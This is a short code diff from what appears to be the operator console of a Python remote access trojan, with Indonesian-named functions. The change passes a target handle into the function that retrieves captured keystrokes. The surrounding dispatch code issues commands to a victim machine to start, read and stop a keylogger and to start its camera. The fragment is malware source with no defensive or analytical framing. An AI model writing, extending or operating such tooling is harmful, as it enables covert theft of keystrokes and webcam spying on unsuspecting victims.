@@ -50,13 +50,13 @@ def start_log():
 
     main_log.set()
 
-def baca_log():
+def baca_log(_target):
     if not main_log.is_set():
         cprint("error, the main function is not running > start_log", 'red')
         return
     
     print("\n")
-    recv_keylog()
+    recv_keylog(_target)
     print("\n")
 
 def stop_log():
@@ -291,7 +291,7 @@ def shellc(_target):
             elif perintah == 'start_log':
                 start_log()
             elif perintah == 'baca_log':
-                baca_log()
+                baca_log(_target)
             elif perintah == 'stop_log':
                 stop_log()
             elif perintah == 'start_cam':
